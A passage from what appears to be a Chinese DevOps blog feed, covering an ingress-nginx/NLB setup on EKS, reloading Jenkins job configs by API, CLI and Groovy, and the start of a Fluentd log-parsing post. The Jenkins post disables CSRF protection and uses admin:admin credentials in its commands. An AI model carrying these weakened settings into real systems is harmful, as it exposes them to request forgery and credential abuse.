ingress-nginx/</span><br><span class="line">$ git checkout nginx-0.30.0</span><br><span class="line">$ git branch</span><br><span class="line">* (HEAD detached at nginx-0.30.0)</span><br><span class="line">  master</span><br></pre></td></tr></table></figure><p>接下来部署<code>deploy/static</code>目录下所有的<code>.yaml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> deploy/static/</span><br><span class="line">$ ls</span><br><span class="line">configmap.yaml  namespace.yaml  rbac.yaml</span><br><span class="line">mandatory.yaml  provider/       with-rbac.yaml</span><br></pre></td></tr></table></figure><blockquote><p>configmap.yaml：存储配置信息，key/value值<br>namespace.yaml：建命名空间<br>mandatory.yaml：包含部署deploy相关所有资源(configmap.yaml,namespace.yaml,rbac.yaml,with-rbac.yaml)<br>rbac.yaml：rbac授权配置,创建Ingress需要使用的(ServiceAccount,ClusterRole,Role,RoleBinding,ClusterRoleBinding)<br>with-rbac.yaml：使用rbac授权的deploy配置，用于构建ingress-controller</p></blockquote><h3 id="4-2-部署service"><a href="#4-2-部署service" class="headerlink" title="4.2 部署service"></a>4.2 部署service</h3><p>创建service就要看你使用的是哪个云厂商了，我使用的AWS云，这里选择<code>deploy/static/provider/aws/</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> deploy/static/provider/aws/</span><br><span class="line">$ ls</span><br><span class="line">patch-configmap-l4.yaml  service-l4.yaml  service-nlb.yaml</span><br><span class="line">patch-configmap-l7.yaml  service-l7.yaml</span><br></pre></td></tr></table></figure><p>我使用的是NLB，所以这里使用<code>service-nlb.yaml</code>这个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl apply -f service-nlb.yaml</span><br></pre></td></tr></table></figure><p>service中的更多相关配置，可以参考：<a href="https://kubernetes.io/docs/concepts/services-networking/service/#ssl-support-on-aws" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/services-networking/service/#ssl-support-on-aws</a></p><p>里面有AWS、阿里、腾讯、百度、Azure等云厂商提供的详细配置</p><blockquote><p>自建集群则使用 deploy/static/provider/baremetal/service-nodeport.yaml 文件创建service</p></blockquote><h3 id="4-3-验证部署"><a href="#4-3-验证部署" class="headerlink" title="4.3 验证部署"></a>4.3 验证部署</h3><p>部署完后，咱们来验证一下部署成果</p><p>查看deploy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get po -n ingress-nginx</span><br><span class="line">NAME                                        READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx-ingress-controller-7cccb55579-bxxbk   1/1     Running   0          28h</span><br></pre></td></tr></table></figure><p>查看svc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get svc -n ingress-nginx</span><br><span class="line">NAME            TYPE           CLUSTER-IP      EXTERNAL-IP      PORT(S)        AGE</span><br><span class="line">ingress-nginx   LoadBalancer   172.20.41.34    ***-**.elb.ap-southeast-2.amazonaws.com   80:32033/TCP,8443:30557/TCP   27h</span><br></pre></td></tr></table></figure><p>访问nginx-ingress</p><p>service地址不能直接访问，我们可以随便进入到一个容器，然后在容器里访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl <span class="built_in">exec</span> -it -n ingress-nginx nginx-ingress-controller-7cccb55579-bxxbk bash</span><br><span class="line"></span><br><span class="line">bash-5.0$ curl 172.20.41.34</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.17.8&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">bash-5.0$</span><br></pre></td></tr></table></figure><p>返回404说明我们已经部署成功了</p><blockquote><p>我这边是AWS环境，创建完以上资源会自动创建一个NLB并且跟svc中的ingress-nginx绑定。</p></blockquote><h2 id="五、对外暴露服务"><a href="#五、对外暴露服务" class="headerlink" title="五、对外暴露服务"></a>五、对外暴露服务</h2><p>一切都准备好后，我们来创建一个对外的服务进行测试</p><h3 id="5-1-创建测试服务nginx"><a href="#5-1-创建测试服务nginx" class="headerlink" title="5.1 创建测试服务nginx"></a>5.1 创建测试服务nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">$ cat nginx.yaml</span><br><span class="line"></span><br><span class="line">kind: Deployment</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-deployment</span><br><span class="line">  namespace: ingress-nginx</span><br><span class="line">  labels:</span><br><span class="line">    app: nginx</span><br><span class="line">  annotations:</span><br><span class="line">    deployment.kubernetes.io/revision: <span class="string">'1'</span></span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      creationTimestamp: null</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">        - name: nginx</span><br><span class="line">          image: <span class="string">'nginx:1.15.4'</span></span><br><span class="line">          ports:</span><br><span class="line">            - containerPort: 80</span><br><span class="line">              protocol: TCP</span><br><span class="line">          resources: &#123;&#125;</span><br><span class="line">          terminationMessagePath: /dev/termination-log</span><br><span class="line">          terminationMessagePolicy: File</span><br><span class="line">          imagePullPolicy: IfNotPresent</span><br><span class="line">      restartPolicy: Always</span><br><span class="line">      terminationGracePeriodSeconds: 30</span><br><span class="line">      dnsPolicy: ClusterFirst</span><br><span class="line">      nodeSelector:</span><br><span class="line">        running_env: qa</span><br><span class="line">      securityContext: &#123;&#125;</span><br><span class="line">      schedulerName: default-scheduler</span><br><span class="line">  strategy:</span><br><span class="line">    <span class="built_in">type</span>: RollingUpdate</span><br><span class="line">    rollingUpdate:</span><br><span class="line">      maxUnavailable: 25%</span><br><span class="line">      maxSurge: 25%</span><br><span class="line">  revisionHistoryLimit: 10</span><br><span class="line">  progressDeadlineSeconds: 600</span><br><span class="line">---</span><br><span class="line">kind: Service</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-service</span><br><span class="line">  namespace: ingress-nginx</span><br><span class="line">  labels:</span><br><span class="line">    app: nginx</span><br><span class="line">spec:</span><br><span class="line">  ports:</span><br><span class="line">    - protocol: TCP</span><br><span class="line">      port: 80</span><br><span class="line">      targetPort: 80</span><br><span class="line">  selector:</span><br><span class="line">    app: nginx</span><br><span class="line">  <span class="built_in">type</span>: NodePort</span><br><span class="line">  sessionAffinity: None</span><br><span class="line">  externalTrafficPolicy: Cluster</span><br><span class="line"></span><br><span class="line">$ kubectl apply -f nginx.yaml</span><br></pre></td></tr></table></figure><h3 id="5-2-创建ingress并对外暴露"><a href="#5-2-创建ingress并对外暴露" class="headerlink" title="5.2 创建ingress并对外暴露"></a>5.2 创建ingress并对外暴露</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ cat ingress-nginx_nginx.yaml</span><br><span class="line"></span><br><span class="line">apiVersion: extensions/v1beta1</span><br><span class="line">kind: Ingress</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-service.qa-01.memoirs.top</span><br><span class="line">  namespace: ingress-nginx</span><br><span class="line">  annotations:</span><br><span class="line">    kubernetes.io/ingress.class: <span class="string">"nginx"</span></span><br><span class="line">    nginx.ingress.kubernetes.io/whitelist-source-range: <span class="string">'0.0.0.0/0'</span>   <span class="comment"># 访问白名单</span></span><br><span class="line">spec:</span><br><span class="line">  rules:</span><br><span class="line">    - host: nginx-service.qa-01.memoirs.top</span><br><span class="line">      http:</span><br><span class="line">        paths:</span><br><span class="line">          - backend:</span><br><span class="line">              serviceName: nginx-service</span><br><span class="line">              servicePort: 80</span><br><span class="line"></span><br><span class="line">$ kubectl apply -f ingress-nginx_nginx.yaml</span><br></pre></td></tr></table></figure><p>然后只需要将刚才的域名解析到之前创建的NLB上即可，如果用https访问只需要在NLB上绑定好域名证书然后将443端口和80端口一样转发到<code>ingress-nginx</code>的80端口就可以了。</p><h3 id="5-3-访问服务"><a href="#5-3-访问服务" class="headerlink" title="5.3 访问服务"></a>5.3 访问服务</h3><p>配置完后，我们来用域名访问一下刚才创建的nginx服务</p><p><img src="/2021/05/20/eks-shi-yong-ingress-nlb-dui-wai-bao-lu-fu-wu/%E5%9B%BE%E7%89%872.png" alt="图片1"></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;一、为什么不想使用AWS的Ingress&quot;&gt;&lt;a href=&quot;#一、为什么不想使用AWS的Ingress&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="kubernetes" scheme="http://chenzhonzhou.github.io/categories/kubernetes/"/>
    
    
      <category term="kubernetes - Ingresss" scheme="http://chenzhonzhou.github.io/tags/kubernetes-Ingresss/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins动态加载job配置文件的方法</title>
    <link href="http://chenzhonzhou.github.io/2021/04/26/jenkins-dong-tai-jia-zai-job-pei-zhi-wen-jian-de-fang-fa/"/>
    <id>http://chenzhonzhou.github.io/2021/04/26/jenkins-dong-tai-jia-zai-job-pei-zhi-wen-jian-de-fang-fa/</id>
    <published>2021-04-26T03:35:58.000Z</published>
    <updated>2021-05-20T09:47:44.488Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在有些时候，Jenkins构建任务是带参数的，而参数内容会经常有变化，就需要手动去修改参数。</p><p>比如：在对k8s容器环境进行发布部署的时候，我们希望开发人员能够自己通过点击jenkins构建任务中的版本号进行回滚，而每次有新的版本部署上线后又会把当前最新的版本加入到可回滚的列表中。如果都是我们手动去界面进行配置，会很麻烦。原则上我们是不需要参与整个过程的，除非自动化过程中遇到问题，才会人工介入。</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>jenkins job的配置都被保存在工作目录下的jobs/$job/config.xml文件中，只要修改config.xml文件就可以了。</p><h2 id="问题难点"><a href="#问题难点" class="headerlink" title="问题难点"></a>问题难点</h2><p>当修改完job的config.xml文件后，去jenkins页面查看发现修改的config.xml配置并没有生效，通常需要重启jenkins服务才能生效，在job任务非常多的情况下每次加入配置都得重启服务，这显然并不实用。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>Jenkins是有动态加载配置的功能的，以下是我经过测试后可以使用的几个方法：</p><h3 id="1、通过Jenkins的API加载job"><a href="#1、通过Jenkins的API加载job" class="headerlink" title="1、通过Jenkins的API加载job"></a>1、通过Jenkins的API加载job</h3><p>通过api加载job配置，有个前提条件：需要在<strong>“系统管理”</strong> –&gt; <strong>“全局安全配置”</strong> -&gt; 取消<strong>“跨站请求伪造保护”</strong>功能。jenkins在<code>2.2xx</code>以后版本无法在控制台页面关闭这个功能。</p><h4 id="1-1-关闭-跨站请求伪造保护"><a href="#1-1-关闭-跨站请求伪造保护" class="headerlink" title="1.1 关闭 跨站请求伪造保护"></a>1.1 关闭 跨站请求伪造保护</h4><p>2.2xx以后的版本，需要在jenkins启动时添加参数来关闭，我这里是docker启动的jenkins，修改以下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim /usr/local/bin/jenkins.sh</span></span><br><span class="line">  <span class="built_in">exec</span> java -Duser.home=<span class="string">"<span class="variable">$JENKINS_HOME</span>"</span> -Dhudson.security.csrf.GlobalCrumbIssuerConfiguration.DISABLE_CSRF_PROTECTION=<span class="literal">true</span> <span class="string">"<span class="variable">$&#123;java_opts_array[@]&#125;</span>"</span> -jar <span class="variable">$&#123;JENKINS_WAR&#125;</span> <span class="string">"<span class="variable">$&#123;jenkins_opts_array[@]&#125;</span>"</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line">  <span class="comment">#exec java -Duser.home="$JENKINS_HOME" "$&#123;java_opts_array[@]&#125;" -jar $&#123;JENKINS_WAR&#125; "$&#123;jenkins_opts_array[@]&#125;" "$@"</span></span><br></pre></td></tr></table></figure><blockquote><p>其它方式部署的jenkins类似，只需要在启动参数中添加 <code>-Dhudson.security.csrf.GlobalCrumbIssuerConfiguration.DISABLE_CSRF_PROTECTION=true</code></p></blockquote><p>然后重启jenkins容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker restart jenkins</span></span><br></pre></td></tr></table></figure><p>重启完jenkins后，前往<strong>“系统管理”</strong> –&gt; <strong>“全局安全配置”</strong> 查看<strong>“跨站请求伪造保护”</strong>已经关闭了</p><p><img src="/2021/04/26/jenkins-dong-tai-jia-zai-job-pei-zhi-wen-jian-de-fang-fa/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><h4 id="1-2-使用-API-加载-job-配置"><a href="#1-2-使用-API-加载-job-配置" class="headerlink" title="1.2 使用 API 加载 job 配置"></a>1.2 使用 API 加载 job 配置</h4><p>加载job配置前，先看看jenkins当前的配置</p><p><img src="/2021/04/26/jenkins-dong-tai-jia-zai-job-pei-zhi-wen-jian-de-fang-fa/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><p>可以看到，在<code>ROLL_BACK</code>目前这里只有一个版本</p><p>接下来通过修改job的config.xml文件为选项增加一个版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep -n 0365 /var/jenkins_home/jobs/devops/jobs/wagepay-loan-in/config.xml</span></span><br><span class="line">48:              &lt;string&gt;master_2021041320365311&lt;/string&gt;</span><br><span class="line"><span class="comment"># sed -i "49i \\              &lt;string&gt;master_2021041320365322&lt;/string&gt;" /var/jenkins_home/jobs/devops/jobs/wagepay-loan-in/config.xml</span></span><br></pre></td></tr></table></figure><p>下面就可以通过API加载job配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># curl -u admin:admin -X POST http://10.0.19.177:9090/job/devops/job/wagepay-loan-in/reload</span></span><br></pre></td></tr></table></figure><p>加载完job配置后，再看看jenkins当前的配置</p><p><img src="/2021/04/26/jenkins-dong-tai-jia-zai-job-pei-zhi-wen-jian-de-fang-fa/%E5%9B%BE%E7%89%873.png" alt="图片3"></p><p>可以看到，刚才添加的配置已经加载生效了</p><h3 id="2、通过jenkins-cli-jar加载job"><a href="#2、通过jenkins-cli-jar加载job" class="headerlink" title="2、通过jenkins-cli.jar加载job"></a>2、通过jenkins-cli.jar加载job</h3><p>这种方式更简单，只需要下载Jenkins命令行工具jenkins-cli.jar</p><p>加载配置前我们先为job的选项添加一个版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep -n 0365 /var/jenkins_home/jobs/devops/jobs/wagepay-loan-in/config.xml</span></span><br><span class="line">48:              &lt;string&gt;master_2021041320365311&lt;/string&gt;</span><br><span class="line">49:              &lt;string&gt;master_2021041320365322&lt;/string&gt;</span><br><span class="line"><span class="comment"># sed -i "50i \\              &lt;string&gt;master_2021041320365333&lt;/string&gt;" /var/jenkins_home/jobs/devops/jobs/wagepay-loan-in/config.xml</span></span><br></pre></td></tr></table></figure><p>通过以下命令加载job，若要同时加载多个job只需要写在reload-job后面即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># java -jar jenkins-cli.jar -s http://10.0.19.177:9090/ -auth admin:admin reload-job devops/wagepay-loan-in</span></span><br></pre></td></tr></table></figure><p>加载完job配置后，再看看jenkins当前的配置</p><p><img src="/2021/04/26/jenkins-dong-tai-jia-zai-job-pei-zhi-wen-jian-de-fang-fa/%E5%9B%BE%E7%89%874.png" alt="图片4"></p><p>可以看到，刚才添加的配置已经加载生效了</p><h3 id="3、通过groovy脚本加载job"><a href="#3、通过groovy脚本加载job" class="headerlink" title="3、通过groovy脚本加载job"></a>3、通过groovy脚本加载job</h3><p>groovy实际上也是通过Jenkins命令行工具jenkins-cli.jar，来实现的</p><h4 id="3-1-加载单个job"><a href="#3-1-加载单个job" class="headerlink" title="3.1 加载单个job"></a>3.1 加载单个job</h4><p>将下面代码保存为文件，<code>job_path</code>变量可以改为你需要加载的job名称</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jenkins.model.Jenkins;</span><br><span class="line"></span><br><span class="line">def job_path = <span class="string">'devops/wagepay-loan-in'</span></span><br><span class="line">Jenkins j = Jenkins.get()</span><br><span class="line">def job = j.getItemByFullName(job_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (job) &#123;</span><br><span class="line">  job.doReload()</span><br><span class="line">  println(<span class="string">"Successful Config reloaded: "</span> + job.fullName);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  println(<span class="string">"Error"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，加载配置前我们先为job的选项添加一个版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep -n 0365 /var/jenkins_home/jobs/devops/jobs/wagepay-loan-in/config.xml</span></span><br><span class="line">48:              &lt;string&gt;master_2021041320365311&lt;/string&gt;</span><br><span class="line">49:              &lt;string&gt;master_2021041320365322&lt;/string&gt;</span><br><span class="line">50:              &lt;string&gt;master_2021041320365333&lt;/string&gt;</span><br><span class="line"><span class="comment"># sed -i "51i \\              &lt;string&gt;master_2021041320365344&lt;/string&gt;" /var/jenkins_home/jobs/devops/jobs/wagepay-loan-in/config.xml</span></span><br></pre></td></tr></table></figure><p>执行以下命令加载job</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># java -jar jenkins-cli.jar -s http://10.0.19.177:9090 -auth admin:admin groovy = &lt; reload-job.groovy</span></span><br><span class="line">Successful Config reloaded: devops/wagepay-loan-in</span><br></pre></td></tr></table></figure><p>加载完job配置后，我们再看看jenkins当前的配置</p><p><img src="/2021/04/26/jenkins-dong-tai-jia-zai-job-pei-zhi-wen-jian-de-fang-fa/%E5%9B%BE%E7%89%875.png" alt="图片5"></p><p>可以看到，刚才添加的配置已经加载生效了</p><h4 id="3-2-加载所有job"><a href="#3-2-加载所有job" class="headerlink" title="3.2 加载所有job"></a>3.2 加载所有job</h4><p>也可以使用以下代码，加载所有job</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jenkins.model.Jenkins;</span><br><span class="line"><span class="keyword">import</span> hudson.model.AbstractItem;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamSource;</span><br><span class="line"></span><br><span class="line">Jenkins.instance.getAllItems(AbstractItem.class).each&#123;job -&gt;</span><br><span class="line">  def configXMLFile = job.getConfigFile();</span><br><span class="line">  def file = configXMLFile.getFile();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line"></span><br><span class="line">    InputStream is = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">    job.updateByXml(<span class="keyword">new</span> StreamSource(is));</span><br><span class="line">    job.save();</span><br><span class="line"></span><br><span class="line">    println(<span class="string">"Config reloaded: "</span> + job.fullName);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行以下命令加载所有job配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># java -jar jenkins-cli.jar -s http://10.0.19.177:9090 -auth admin:admin groovy = &lt; reload-all-job.groovy</span></span><br><span class="line">Config reloaded: aaa</span><br><span class="line">Config reloaded: bbb</span><br><span class="line">Config reloaded: devops</span><br><span class="line">Config reloaded: devops/wagepay-loan-in</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h2&gt;
      
    
    </summary>
    
    
      <category term="Jenkins" scheme="http://chenzhonzhou.github.io/categories/Jenkins/"/>
    
    
      <category term="Jenkins" scheme="http://chenzhonzhou.github.io/tags/Jenkins/"/>
    
  </entry>
  
  <entry>
    <title>Fluentd提取日志级别level作为新字段</title>
    <link href="http://chenzhonzhou.github.io/2021/04/09/fluentd-ti-qu-ri-zhi-ji-bie-level-zuo-wei-xin-zi-duan/"/>
    <id>http://chenzhonzhou.github.io/2021/04/09/fluentd-ti-qu-ri-zhi-ji-bie-level-zuo-wei-xin-zi-duan/</id>
    <published>2021-04-09T09:24:23.000Z</published>
    <updated>2021-04-12T08:03:12.409Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="事情起因"><a href="#事情起因" class="headerlink" title="事情起因"></a>事情起因</h2><p>上次对超出docker 16k的大日志做了拼接后，虽然多行日志合并到了一行显示，但在查日志的时候依然不是特别方便；因为在很多情况下需要根据日志的<code>level</code>级别进行单独过滤，这次把日志中的<code>level</code>级别提取出来然后形成新的字段。</p><h2 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h2><p>通过统计日志发现，目前现网中存在多种日志格式，这里暂且划分为<strong>标准日志</strong>格式和<strong>非标准日志</strong>格式，它们的日志内容大致如下所示：</p><h3 id="标准日志"><a href="#标准日志" class="headerlink" title="标准日志"></a>标准日志</h3><p>服务打到docker容器中的标准格式日志如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"log"</span>:<span class="string">"[2021-03-15 20:20:58.255] [] [DEFAULT.autoRefreshFlowGraphJob_Scheduler_Worker-1] INFO  [com.pintec.jingway.job.AutoRefreshFlowGraphJob] [38] - AutoRefreshFlowGraphJob 开始刷新, flowName:[Init_Test] \n"</span>,<span class="attr">"stream"</span>:<span class="string">"stdout"</span>,<span class="attr">"time"</span>:<span class="string">"2021-03-15T09:20:58.256399067Z"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"log"</span>:<span class="string">"[2021-03-15 20:20:58.259] [] [DEFAULT.autoRefreshFlowGraphJob_Scheduler_Worker-1] INFO  [com.pintec.jingway.flow.FlowHolder] [235] - url：http://******/Init_Test/online,flowName:Init_Test,body:&#123;\"status\":302,\"message\":\"[&#123;\\\"params\\\":&#123;&#125;,\\\"resourceKey\\\":\\\"mflow_tempInvalid\\\"&#125;]\",\"data\":null,\"code\":302&#125; \n"</span>,<span class="attr">"stream"</span>:<span class="string">"stdout"</span>,<span class="attr">"time"</span>:<span class="string">"2021-03-15T09:20:58.25939643Z"</span>&#125;</span><br></pre></td></tr></table></figure><p>可以看到标准日志都有共同点 <code>[] [] [] level []</code></p><h3 id="非标准日志"><a href="#非标准日志" class="headerlink" title="非标准日志"></a>非标准日志</h3><p>当然，也有一些非标准格式日志类似如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"log"</span>:<span class="string">"13:25:58.570 [http-nio-8080-exec-48] DEBUG org.javalite.activeweb.RequestDispatcher - Loaded routes from: app.config.RouteConfig\n"</span>,<span class="attr">"stream"</span>:<span class="string">"stdout"</span>,<span class="attr">"time"</span>:<span class="string">"2021-04-02T02:25:58.570630811Z"</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><p>在几经沟通后并确认后，标准格式日志占80%以上，最后确定下来只需要对标准日志提取<code>level</code>字段，而非标准日志则不提取；后续由开发同学将日志统一更换为标准格式日志。</p><h2 id="过程中遇到的问题"><a href="#过程中遇到的问题" class="headerlink" title="过程中遇到的问题"></a>过程中遇到的问题</h2><h3 id="fluentd占用资源"><a href="#fluentd占用资源" class="headerlink" title="fluentd占用资源"></a>fluentd占用资源</h3><p>在进行配置前fluentd平均在线上占用的资源为20m左右cpu、120Mi左右内存；然后，在刚开始的调试过程中发现fluentd占用的资源有明显上升。</p><p>经过多次测试发现是因为fluentd在进行正则匹配时，如果遇到无法匹配的日志fluentd就会疯狂的输出日志，这时cpu和内存资源会飞快的上升，如下图所示：</p><p><img src="/2021/04/09/fluentd-ti-qu-ri-zhi-ji-bie-level-zuo-wei-xin-zi-duan/%E5%9B%BE%E7%89%874.png" alt="图片4"></p><p><strong>解决方案</strong>：需要合理调整fluentd中插件的先后顺序，再一个可以区分开无法匹配的日志另行处理（这个在后面配置文件中# 区分标准格式和非标准格式日志）。</p><h3 id="需要舍弃部分日志"><a href="#需要舍弃部分日志" class="headerlink" 